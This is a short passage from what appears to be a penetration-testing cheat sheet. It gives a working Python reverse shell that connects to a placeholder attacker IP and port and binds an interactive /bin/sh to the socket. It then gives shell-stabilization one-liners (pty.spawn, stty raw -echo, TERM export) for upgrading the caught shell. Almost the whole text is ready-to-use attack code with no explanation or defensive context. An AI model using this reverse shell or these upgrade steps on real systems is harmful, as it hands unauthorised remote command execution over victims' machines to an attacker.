
### Python

```bash
import socket
import subprocess
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("$IP", $PORT))

os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

subprocess.call(["/bin/sh", "-i"])
```

### Shell Stabilization

```bash
# Python
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Python 2
python -c 'import pty; pty.spawn("/bin/bash")'
```

```bash
# Background shell (Ctrl+Z), then:
stty raw -echo; fg
reset
export TERM=xterm
```
